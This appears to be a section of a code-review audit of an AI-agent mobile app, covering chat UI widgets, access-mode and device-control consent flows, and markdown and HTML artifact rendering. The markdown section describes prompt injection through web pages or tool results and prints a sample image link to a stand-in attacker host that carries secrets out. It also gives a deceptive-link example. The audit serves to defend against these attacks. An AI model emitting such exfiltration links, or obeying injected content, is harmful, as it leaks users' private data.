- **P2 · perf · chat_screen.dart:7920, 7931-7949** · `existsSync`, `createTempSync`, `writeAsStringSync` and `deleteSync(recursive)` all run on the UI thread. That is fine on internal storage, but it can stall on slow SD cards or USB OTG. · Use the async APIs.
- **P2 · error state · chat_screen.dart:7911-7917** · Picker exceptions are swallowed (`catch (_) { path = null; }`), so a picker failure looks identical to the user cancelling. · Show "Could not open the folder picker" and log through `Diag`.
- **P2 · copy · chat_screen.dart:7850, 7872, 7913, 7965, 7977** · The terms "Sandbox folder (Studio)", "Select working folder", "Studio sandbox folder" and "Working folder" are used interchangeably. The SnackBar says "read-only for **Ovid Si**", which is a stray brand name. · Use one term ("Working folder") and fix the brand string.
- **P2 · a11y · chat_screen.dart:7774-7823** · The chip is a `GestureDetector` about 30dp tall, with no button semantics and no label beyond the visible basename. · Wrap it in `Semantics(button: true, label: 'Working folder: <label>')` with a minimum height of 48dp. The same applies to the Plan and Mode chips (section 14).

**Missing features**
- No recent-folders list, and no indication of the folder's git status (branch, dirty files) in the chip.

**Tests to add**
- Widget test: long-press is not the only route, and the sheet opens from a discoverable control.
- Widget test: with `busyFor(sid) == true`, both sheet actions are disabled.

---

## 14. Plan chip, Mode chip + access-mode sheet (`_PlanChip`, `_ModeChip`, `_showModeSheet`)

**What it is / how reached:** Composer toolbar chips. The Plan chip (amber) is visible while plan mode is on or pending, and tapping it turns plan mode off. The Mode chip shows the current access mode, and tapping it opens "Agent access mode" with Safe / Auto / Full Access / Studio / Control. Control goes through `_enableControlMode` (section 15).

**Findings**
- **P1 · safety · chat_screen.dart:8112-8118 (+ core/agent_service.dart:17786)** · Switching to **Full Access** (`AgentMode.drive`), which skips every app-level approval, takes one tap. There is no confirmation, and it takes effect immediately even while a run is in progress (`setMode` applies to the running session). · A mis-tap in the sheet lets the agent run shell commands and edit files with no prompts. · Show a confirm dialog the first time per session ("Ovid will run commands and change files without asking. Destructive commands still ask."), and when a run is active, apply the change at the next turn boundary or ask.
- **P2 · UX · chat_screen.dart:8001-8004** · Tapping the Plan chip exits plan mode instantly. The chip looks like a status badge rather than a button, and there is no confirmation or Undo. · Add a trailing ✕ to signal the action, plus the tooltip "Exit plan mode" and a SnackBar with Undo.
- **P2 · bug (verify) · core/agent_service.dart:5769** · `setMode` clears plan mode on `_runSession ?? activeSession`. When a background session is running, a mode pick in the foreground composer can clear the *background* session's plan mode. · Pass the composer's `sessionId` explicitly into `setMode`.
- **P2 · consistency · chat_screen.dart:8077-8127 vs 1990-2024** · There are two near-identical "Agent access mode" sheets with different styling (one shows icons, one does not). · Extract one `showAccessModeSheet(context, sessionId)`.
- **P2 · a11y · chat_screen.dart:8001, 8046** · Both chips are `GestureDetector`s about 30dp tall with no semantics. Mode is shown by colour and label only. That is acceptable visually, but TalkBack hears nothing actionable. · Add `Semantics(button: true, label: 'Access mode: Full Access. Double-tap to change')` and a minimum height of 48dp.

**Missing features / Claude Code parity**
- No visible per-mode summary of what is auto-approved. Claude Code's `/permissions` lists allow/deny rules. Link "Manage permissions" from the bottom of the sheet to the Permissions screen.

**Tests to add**
- Widget test: choosing Full Access shows a confirmation, and cancelling leaves the mode unchanged.

---

## 15. Control-mode consent dialogs + Control service notice (`_enableControlMode`, `_ControlServiceNotice`)

**What it is / how reached:** Choosing Control in either mode sheet triggers this sequence: (1) the first time only, a non-dismissible "Enable Control mode" prominent-disclosure dialog (`kControlModeDisclosure`) with Not now / Enable Control; (2) the mode is set to Control; (3) the first time only, the system battery-optimisation exemption request; (4) if app notifications are off, "Keep Ovid alive in the background?" with Not now / Turn on; (5) if the accessibility service is off, a deep link to Accessibility Settings. In the composer, `_ControlServiceNotice` shows inline warnings: service off, enabled-but-stale binding, and OEM battery-killer guidance with Fix.

**Findings**
- **P1 · safety · core/state.dart:106-109 (shown in chat_screen.dart:8141)** · The disclosure promises that Ovid won't act on banking or payment screens, but the blocklist covers only seven US brands (PayPal, Wise, Chase, BofA, Wells Fargo, Citi, Capital One). For a global audience, UPI apps (PhonePe, Paytm, Google Pay, BHIM), EU/UK banks, crypto wallets and app stores with saved cards are all open to the agent. · The agent can tap through money-moving flows in apps users would assume are protected. · Block by signal, not by brand: `FLAG_SECURE` windows, the Play `FINANCE` category, a server-updated package list, and payment-sheet detection. Require a per-action confirm inside any finance-category app. Reword the disclosure to match what is actually enforced.
- **P2 · UX · chat_screen.dart:8130-8236** · First enable shows up to four interruptions back to back: the disclosure, the system battery dialog, the notification dialog, and an Accessibility Settings jump. None of them shows progress or explains why the next one is coming. · Show one "Set up Control" checklist sheet with three steps (Accessibility, Notifications, Battery) and live ticks, and let the user run each step from there.
- **P2 · state · chat_screen.dart:8158, 8221-8235** · The mode is switched to Control *before* the accessibility service is confirmed. If the user backs out of Settings, the chip says Control and every device action fails until the notice row is read. · Keep the previous mode until `isEnabled()` is true on resume, or show a blocking banner "Control is not active yet" with a Finish setup button.
- **P2 · perf/bug · chat_screen.dart:8338-8344** · `_refresh()` runs from inside `build()` while `_enabled == null`. The builder listens to `AgentService.I`, which notifies on every stream event, so several concurrent `isEnabled()` / `serviceState()` / `backgroundHealth()` platform calls are fired before the first one resolves. · Add a `_refreshing` guard, and trigger the refresh from a mode-change listener instead of from build.
- **P2 · layout · chat_screen.dart:8367-8435** · Each warning is a `Row` holding an `Expanded` 11sp text and a long `TextButton("Open Accessibility Settings")`. At 320dp the message is squeezed to about 70dp. Up to three rows can stack inside the composer. · Use a short action label ("Open settings"), place the button under the text on narrow widths, and show only the highest-priority warning.

**Missing features**
- No always-visible "Ovid is controlling your device · Stop" overlay or notification action while Control runs act in other apps. Verify that the foreground-service notification has a Stop action; otherwise add one.
- No per-app allow/deny list for Control mode in this flow.

**Tests to add**
- Widget test: accepting the disclosure persists `controlDisclosureAccepted`, and a second enable shows no dialog.
- Widget test: rebuilding the notice ten times while `_enabled == null` triggers exactly one `isEnabled()` call (using a fake `DeviceControlService`).

---

## 16. Markdown renderer, code boxes and links (`_OvidMarkdown`, `_OvidCodeBox`, `_DiffLines`, `_CopyButton`, `_openLink`)

**What it is / how reached:** Every assistant answer, and the reasoning and tool detail rows. Fenced code is split out with a regex into copyable boxes with diff colouring. `<font color>` spans become coloured text. The remaining prose goes to `MarkdownBody(selectable: true)`. Links open http(s) in the in-app browser and use the platform handler for other schemes.

**Findings**
- **P1 · security/privacy · chat_screen.dart:8571-8577 (+ flutter_markdown_plus 1.0.12 `_functions_io.dart:25-60`)** · No `imageBuilder` / `sizedImageBuilder` is set, so the package default runs: `![x](https://…)` is fetched with `Image.network` as soon as the answer renders, and other schemes go to `Image.file`. Model output can be steered by prompt-injected web pages, MCP results or files, and it can embed `![](https://attacker/p?d=<secret from context>)`. That is the classic markdown-image exfiltration channel. The fetch also leaks the user's IP, and remote images are decoded at full size with no `cacheWidth`. · Private context leaks with zero clicks. · Supply an `imageBuilder` that renders a placeholder ("Image from host.com · Tap to load") for http(s), allows `data:` and workspace-relative files only, never `Image.file` outside the workspace, and decodes with `cacheWidth`. Optionally allowlist the app's own CDN.
- **P2 · security · chat_screen.dart:8648-8702** · The link text can differ from the `href` (`[google.com](https://evil.example)`), and taps open immediately. Non-http schemes (`intent:`, `sms:`, `tel:`, custom deep links into other apps) launch externally with no confirmation. · Users get phished, or other apps get triggered by model-authored links. · When the text does not match the host, or the scheme is not http(s), show a sheet with the real URL and Open / Copy actions.
- **P2 · bug · chat_screen.dart:8673, 8690-8700** · The documented "fall back to the in-app browser" never happens. `fallback()` calls the same `launchUrl(externalApplication)` again without `await`, so it cannot fall back and its failure goes unhandled (the inner `catch` never fires). · Make `fallback` `BrowserScreen.open` for web-safe URIs, or show the SnackBar directly.
- **P2 · bug · chat_screen.dart:8498** · `_fenceRe = ```(\w*)\n…```` misses language tags such as `c++`, `objective-c`, `shell script` and `json5`, fences with trailing spaces, `~~~` fences, and indented fences inside list items. It also misses an unclosed fence, which is the normal state while streaming and is also what a truncated answer leaves. Those blocks render as raw backticks inside prose, without the copy box. · Let the markdown parser find code blocks (`builders: {'pre': …}` or a `code` builder that checks `element.attributes['class']`) instead of a pre-split regex.
- **P2 · bug · chat_screen.dart:8710-8715, 8795** · `_isDiff` is true when *any* of the first 8 lines starts with `+` or `-`, which matches YAML lists, markdown bullets, `--flags` and negative numbers. Those blocks get red/green colouring and lose selection, because `_DiffLines` uses plain `Text` rather than `SelectableText`. · Treat a block as a diff only for `lang ∈ {diff, patch}`, or when it has `@@` hunks or `+++`/`---` headers. Make `_DiffLines` selectable.
- **P2 · UX · chat_screen.dart:8511-8549** · Prose is split into separate `MarkdownBody` and `SelectableText` blocks at every code fence and every `<font>` span. A coloured word in mid-sentence breaks the paragraph onto its own line, and text selection cannot cross blocks, so the user cannot select-copy an answer that contains a code block. · Wrap the whole column in one `SelectionArea` with `selectable: false` children, and render `<font>` as an inline syntax extension (`md.InlineSyntax`) instead of a block split.
- **P2 · perf · chat_screen.dart:8510-8549** · Each build of a *finished* message re-runs both regexes and re-parses the markdown, and that happens on every `AppState` / `AgentService` notify that rebuilds the list (streaming storms are already known). · Memoise the parsed `parts` per `(content, fontSize)` in a small LRU cache, or make `_OvidMarkdown` stateful and cache it in `didUpdateWidget`.
- **P2 · a11y · chat_screen.dart:8759-8766, 8834-8838** · Code is fixed at 11-12sp and ignores the user's chat font-size setting (`fontSize` is not passed to the code box). There is no line-wrap toggle, so long lines require horizontal scrolling on phones. · Scale the code font with `fontSize - 3`, and add a Wrap toggle next to Copy.

**Missing features (vs ChatGPT / Claude mobile)**
- No syntax highlighting. No LaTeX/math rendering, which both reference apps have and which students rely on. No Mermaid diagrams.
- No "Open in Studio" or "Save as file" on code blocks, and no Copy on tables.

**Tests to add**
- Widget test: `![x](https://example.com/a.png)` creates no `NetworkImage` until the placeholder is tapped.
- Widget test: a ```` ```yaml ```` block with `- a` lines is not rendered as a diff and is selectable.
- Widget test: a ```` ```c++ ```` fence renders an `_OvidCodeBox` with label `c++`.

---

## 17. HTML artifact view (`html_artifact_view.dart`, inline card + fullscreen route)

**What it is / how reached:** An assistant row of kind `htmlArtifact` (chat_screen.dart:4603) renders an `AetherCard` with the title, View source / Expand preview controls, a collapse button, an "OFFLINE SANDBOX" badge, a "Preview status" line, and an `AndroidView` WebView (`ovid/html-artifact`) running the model-authored HTML/CSS/JS in a sandboxed `srcdoc` iframe. Expand pushes a fullscreen route. View source shows HTML, CSS and JS with copy buttons.

**Positive:** the sandbox is solid. The outer and inner CSP use `default-src 'none'`, `connect-src 'none'` and `img-src data:`, the iframe is `sandbox="allow-scripts"` with an opaque origin, there is no JS bridge, native navigation is denied, and errors never echo user source (core/html_artifact.dart:120-150, view L142-151).

**Findings**
- **P1 · UX/a11y · html_artifact_view.dart:307-333, 374-376** · On any viewport under 560dp, which means every phone in portrait, the controls render in "compact" form. The *text* labels "View source", "Show preview", "Expand preview" and "Exit fullscreen" are forced through `FittedBox(scaleDown)` into a 48×48 box. A 14sp label about 110dp wide shrinks to roughly 6sp, which is unreadable. The same happens at any text scale above 1.0. · The main artifact controls are illegible on phones. · In compact mode, use an `IconButton` (`Icons.code` / `Icons.preview_outlined` / `Icons.fullscreen`) with the label as tooltip and semantics, or an overflow menu.
- **P2 · UX · html_artifact_view.dart:559-566** · The inline `AndroidView` passes no `gestureRecognizers`, so vertical drags inside the artifact go to the transcript `ListView`. Scrollable content, sliders, canvas drawing and swipe games do not work inline, and only taps get through. · Add `{Factory(() => EagerGestureRecognizer())}` while the artifact is focused (for example after a tap-to-interact), or point users to fullscreen with a "Tap to interact" overlay.
- **P2 · state loss · html_artifact_view.dart:276-290, 397-400, 216-260, 638-641** · Every lifecycle change other than `resumed` stops and destroys the document. That includes `inactive`, which fires when the user pulls down the notification shade, a permission dialog opens, or split-screen focus changes. Toggling source, collapsing and expanding also restart it. · A game, form or calculator loses all state on any of these. · Stop only on `paused`/`hidden`. Consider handing the same native view to the fullscreen route, or at least warn "Expanding restarts the preview".
- **P2 · perf/battery · html_artifact_view.dart:554-566** · Every artifact that scrolls into view creates its own WebView and auto-runs its JavaScript. A chat with several artifacts runs several renderers while the user scrolls past them. · Allow only one live inline preview at a time. Others show a static "Tap to run" placeholder, which also avoids auto-executing model JS.
- **P2 · copy · html_artifact_view.dart:483-500, 583-604, 568-582** · Every artifact shows an "OFFLINE SANDBOX" pill plus "● Preview status Ready", which is developer-facing text taking about 60dp above the preview. · Replace them with a small lock icon (tooltip "Runs offline, no network access"), and show status text only for non-ready states.
- **P2 · error state · html_artifact_view.dart:505-509** · A missing or foreign artifact renders an unstyled bare `Text`: "Artifact unavailable: missing, invalid, or owned by another session." · Use a styled card with "This preview is no longer available".
- **P2 · layout · html_artifact_view.dart:380-387, 613-617** · The title has `softWrap: true` with no `maxLines`. In the fullscreen AppBar, whose height is computed for about 2.8 lines, a long title is clipped. Inline, a long title pushes the card tall. · Use `maxLines: 2, overflow: ellipsis` and keep the tooltip.
- **P2 · perf · html_artifact_view.dart:462-465** · Source view renders the whole HTML/CSS/JS as single `SelectableText`s. A 100KB script lays out in one paragraph and janks. · Show the first N lines with "Show all", or use a lazily built line list. The font family `'JetBrainsMono'` is hard-coded and should be `Aether.mono`.

**Missing features (vs Claude artifacts)**
- No Share / Download as `.html` and no "Open in browser".
- JS errors are never surfaced, and there is no "Fix with Ovid" action (Claude shows the error and offers "Try fixing").
- No version history across regenerations, and the height does not fit the content (a fixed `height` clamped to 160-640).

**Tests to add**
- Widget test at 360dp: the compact controls are `IconButton`s, and the label text is not scaled below 12sp.
- Widget test: `didChangeAppLifecycleState(inactive)` does not stop the document, and `paused` does.

---

## 18. Small transcript widgets: runtime-install banner, typing indicator, older-messages indicator (`_RuntimeInstallBanner`, `_TypingBubble`, `_OlderMessagesIndicator`)

**What it is / how reached:** On first launch, a banner above the composer shows the Node.js + Python background install (progress bar, live installer line, Retry on failure, dismiss). `_TypingBubble` is the "Working…" / live status line at the end of a running transcript. `_OlderMessagesIndicator` appears at the top of the bounded subagent transcript (chat_screen.dart:105-112).

**Findings**
- **P2 · bug · chat_screen.dart:6597-6598 (used at 114)** · `_TypingBubble` always reads the status of `AppState.I.activeSessionId`. In the subagent transcript it shows the *parent* session's status, not the child's. · Pass `sessionId` into `_TypingBubble`.
- **P2 · UX · chat_screen.dart:6564-6584** · "Older messages not shown" cannot be tapped, so earlier subagent history cannot be reached at all. · Make it a "Load earlier" button that grows `visibleCount`.
- **P2 · error state · chat_screen.dart:8896-8899, 8944-8954** · The failed banner says only "Background setup needs attention" and then shows the raw installer line (a mono log line, possibly an exception). There is no plain-language reason (no network? storage full?) and no link to Health. The dismiss button uses `BoxConstraints()` with 4dp padding, about 24dp. · Map the known failure codes to plain copy, add "Details" opening Health, and restore the 48dp IconButton constraints. The Retry button's `minimumSize: Size(0, 30)` should also be 48.
- **P2 · a11y · chat_screen.dart:6602-6619** · The status line is not a live region, so TalkBack users are not told that the agent is retrying or compacting. · Wrap it in `Semantics(liveRegion: true)` and throttle updates to about 1 per 3 s.

**Tests to add**
- Widget test: the subagent transcript shows the child status in `_TypingBubble`.

---

## Group summary

**Coverage:** every screen, sheet and dialog in `chat_screen.dart` L4500–8970 and `html_artifact_view.dart`, read in full (sections 1–18). Totals: **0 P0, 26 P1, 74 P2**. Two P1s in sections 6 and 7 are cross-references to section 4, so there are 24 unique P1s.

**Top 10 fixes, in the order to do them**

| # | Fix | Sections | Sev | Effort |
|---|---|---|---|---|
| 1 | Bind approval buttons to the rendered request (`approveRequest(req, …)` with an identity check, plus a short tap debounce). Make long approval details fully scrollable, and put the actions on their own 48dp row. | 11 | P1 security | S |
| 2 | Safe markdown `imageBuilder`: no automatic remote or file image loads (tap-to-load placeholder, `cacheWidth`). Add a link-confirm sheet for non-http schemes and for links whose text does not match the host. | 16 | P1 security | S |
| 3 | Confirm before switching to Full Access, and defer mode changes made mid-run to the turn boundary. Pass `sessionId` into `setMode`. | 14 | P1 safety | S |
| 4 | Control mode: replace the 7-brand finance blocklist with signal-based blocking (FLAG_SECURE, FINANCE category, server list, UPI apps), and reword the disclosure to match. Merge the four setup prompts into one checklist. | 15 | P1 safety | M |
| 5 | Regenerate truncates from the last user row; Edit & resend states how many messages it removes and offers Undo; rename "Revert" to "Delete message". | 1 | P1 bug/data | S |
| 6 | Stop data loss in the composer: the Generate-image path must not overwrite the draft, voice inserts text instead of auto-sending, Queue "Clear all" gets Undo, and Attach/Mic are disabled when locked. | 4, 6, 7, 10 | P1 data loss | S |
| 7 | Fix `@` mentions: `@file:` tokens with file-first resolution; async, debounced, capped directory listing (no `listSync` in build); block `..`. | 5 | P1 bug/perf | M |
| 8 | Goal bar: hide when complete, make Clear set `goal = null`, add Resume for blocked. Working folder: make the sheet discoverable from a tap, and lock it while a run is busy. | 8, 13 | P1 bug/UX | S |
| 9 | Replace the All Files Access fallback in the working-folder flow with SAF persisted tree URIs (Play policy risk). Fix the image "Open" action through FileProvider. | 13, 2 | P1 policy/bug | M–L |
| 10 | Tap targets and semantics pass: message action row, composer chips (folder/plan/mode), question chips (`ChoiceChip`), todo header, banner buttons. Replace the illegible compact artifact controls with IconButtons. | 1, 9, 12, 13, 14, 17, 18 | P1 a11y | M |

**Next tier (P2, batch later):** markdown fence/diff detection and whole-answer selection (16); artifact gestures, lifecycle state loss and one live WebView (17); sync IO in image rows (2); attachment-chip overflow (3); MCP prompts as `/` and resources as `@` (5, parity); camera capture and clipboard image paste (6); TTS / read aloud, regenerate variants, and checkpoint/rewind parity (1).

**Suggested PR split:** (a) approvals + mode/consent safety [1, 3, 4] → (b) markdown/link hardening [2] → (c) history/composer data-loss fixes [5, 6, 8] → (d) mentions/perf [7] → (e) storage/policy [9] → (f) a11y sweep [10].
